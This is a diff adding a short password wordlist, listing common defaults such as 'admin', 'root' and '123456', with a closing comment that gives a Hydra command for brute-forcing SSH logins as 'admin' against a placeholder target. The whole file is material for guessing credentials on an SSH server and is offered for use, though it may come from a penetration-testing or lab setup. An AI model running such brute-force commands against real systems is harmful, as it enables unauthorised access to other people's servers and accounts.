@@ -1,0 +1,7 @@
+password123
+admin
+root
+123456
+cyberzv5
+# Add more passwords as needed
+# Use with Hydra: hydra -l admin -P hydra_passwd.txt ssh://target_ip
